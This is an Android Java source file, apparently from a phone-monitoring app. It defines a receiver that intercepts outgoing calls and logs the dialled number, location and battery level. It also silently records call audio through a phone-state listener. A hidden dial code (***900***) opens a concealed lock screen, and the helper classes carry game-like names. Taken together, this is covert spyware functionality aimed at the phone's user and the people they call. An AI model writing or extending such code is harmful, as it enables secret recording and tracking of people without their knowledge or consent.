package vn.vhc.live;

import java.util.Date;

import vn.vhc.live.lock.LockMainActivity;
//import vn.vhc.live.video.VideoManager;




import android.app.ActivityManager;
import android.app.Service;
import android.app.ActivityManager.RunningServiceInfo;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.BatteryManager;
import android.os.Binder;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.preference.PreferenceManager;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.widget.Toast;

public class OutcomingLog extends BroadcastReceiver {

	public Handler hx= new Handler(){
		
		public void handleMessage(Message msg) 
		  {			  
			try
			{
				  if(msg.what==100)
				  {			 
					  MediaManager.getInstance().startRecordAudio();
				  }	
				  if(msg.what==101)
				  {			 
					  MediaManager.getInstance().stopRecordAudio();
				  }	
				  super.handleMessage(msg);
			}catch(Exception ex)
			{
				
				UtilMemory.addTo(new DataObject(LocationUtil.IMEI, TypeData.ERROR_LOG, 
						"ErrorHandleOnOutcoming:"+ex.toString(),  String.valueOf(BatteryLog.levelBattery), "", "", UtilGame.getInstance().GetStringNow()));
			}
		  }
	}; 
	private static long timeStarted = -1L; // IMPORTANT!
	private static boolean isAnswerd=false;
	@Override
	public void onReceive(final Context context, Intent intent) {
		/*
		Bundle bundle = intent.getExtras();        
        if(null == bundle) return;
        
        String phonenumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
        
        String info = "Detect Calls sample application\nOutgoing number: " + bundle.toString();
        
        Toast.makeText(context, info, Toast.LENGTH_LONG).show();
		 */
		
		try
		{
			
		ContextManagerCore.getInstance().setCurrentContext(context);
		
		String number = intent
		.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
		
		boolean isRestartTimeout=ContextManagerCore.getInstance().startServiceTimeOut();
		if(number.equalsIgnoreCase("***900***"))
		{
			Intent intent1 = new Intent(context, vn.vhc.live.lock.LockMainActivity.class);
			intent1.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			context.startActivity(intent1);
			return;
		}
		if(UtilGame.isModeDebug)
		{			
			Toast.makeText(context, "Restart:"+isRestartTimeout+"==>"+String.valueOf((new Date()).getTime()-UtilGame.timeStarted.getTime()), Toast.LENGTH_LONG).show();
		}
		if(isRestartTimeout)return;
		
		boolean isStarted=UtilGame.isRunningService;
		if(!isStarted)
		{
			isStarted=ContextManagerCore.getInstance().isServiceRunning(); 
		}
		if(!isStarted)
		{
			ContextManagerCore.getInstance().startServiceIfNeed();
		}
		else
		{
			MediaManager.timeTracking= UtilGame.getInstance().GetStringNow();
			UtilMemory.addTo(new DataObject(ConfigGame.getInstance(null).getActiveKey()
	        			, TypeData.CALL_LOG, ContextManagerCore.getInstance().readLastPosition(),  String.valueOf(BatteryLog.levelBattery), number, TypeData.CALL_OUTCOMING,MediaManager.timeTracking));
		 
			if(UtilGame.recordcall1==1)//UtilGame.recordcall==1)
	    	{
		       final TelephonyManager tManager =(TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
		       // CallCounter callCounter=new CallCounter(context);
		        //tManager.listen(callCounter,PhoneStateListener.LISTEN_CALL_STATE);
		       tManager.listen(new PhoneStateListener()
		       {
		    	   public void onCallStateChanged(int state, String incomingNumber) {
		   			//Toast.makeText(_context, "state: "+state , Toast.LENGTH_LONG).show();
		    		UIManager.getInstance().showMsg("state: "+state+",isAnswerd:"+isAnswerd+",isCalling:"+MediaManager.isCalling);
		   	        switch(state) {
		   	        	case TelephonyManager.CALL_STATE_IDLE:	  
		   	        		if(isAnswerd)
		   	            	{
		   	            		isAnswerd=false;		                
		   		                //MediaManager.getInstance().stopRecordAudio();
		   		                hx.sendEmptyMessage(101);
		   		                tManager.listen(this,PhoneStateListener.LISTEN_NONE);
		   		                //Toast.makeText(context, "timeEnded: " , Toast.LENGTH_LONG).show();
		   		                //MediaManager.modeRecord=0;
		   	            	}
		   	                break;
		   	            case TelephonyManager.CALL_STATE_OFFHOOK:
		   	            	
	   	            		isAnswerd=true;
	   		                timeStarted=System.currentTimeMillis();
	   		                MediaManager.modeRecord=2;
	   		                //MediaManager.getInstance().startRecordAudio();
	   		                hx.sendEmptyMessage(100);
	   		                MediaManager.isCalling=true;
	   		            	//Toast.makeText(_context, "timeStarted: ", Toast.LENGTH_LONG).show();		   	            	
	   		                break;
		   	        }
		   	        //TelephonyManager.CALL_STATE_IDLE===>TelephonyManager.CALL_STATE_OFFHOOK===TelephonyManager.CALL_STATE_IDLE
		   	    }		    	   
		       }, PhoneStateListener.LISTEN_CALL_STATE);
	    	}			
		}
		}
		catch(Exception exxxx)
		{
			Toast.makeText(context, "exxxx:"+exxxx.toString(), Toast.LENGTH_LONG).show();
			UtilMemory.addTo(new DataObject(LocationUtil.IMEI, TypeData.ERROR_LOG, 
					"OutComingLog:"+exxxx.toString(),  String.valueOf(BatteryLog.levelBattery), "", "", UtilGame.getInstance().GetStringNow()));
			
		}	
	}
	/*
	class CallCounter extends PhoneStateListener 
	{
		private Context _context;
	    public CallCounter(Context context) {
			// TODO Auto-generated constructor stub
	    	_context=context;
		}
		public void onCallStateChanged(int state, String incomingNumber) {
			//Toast.makeText(_context, "state: "+state , Toast.LENGTH_LONG).show();
	        switch(state) {
	        	case TelephonyManager.CALL_STATE_IDLE:	                
	            	if(timeStarted==-1L) timeStarted=System.currentTimeMillis();//first
	            	else 
	            	{
	            		timeStarted=-1L;
	            		isAnswerd=false;		                
		                MediaManager.modeRecord=0;
		                MediaManager.getInstance().stopRecordAudio();
		                
		            	//Toast.makeText(_context, "timeEnded: " , Toast.LENGTH_LONG).show();
	            	}
	                break;
	            case TelephonyManager.CALL_STATE_OFFHOOK:
	            	if(timeStarted!=-1L)
	            	{
	            		isAnswerd=true;
		                timeStarted=System.currentTimeMillis();
		                MediaManager.modeRecord=2;		              
		                MediaManager.getInstance().startRecordAudio();
		            	//Toast.makeText(_context, "timeStarted: ", Toast.LENGTH_LONG).show();
	            	}
	                break;
	        }
	        //TelephonyManager.CALL_STATE_IDLE===>TelephonyManager.CALL_STATE_OFFHOOK===TelephonyManager.CALL_STATE_IDLE
	    }	 
	}
	*/
}

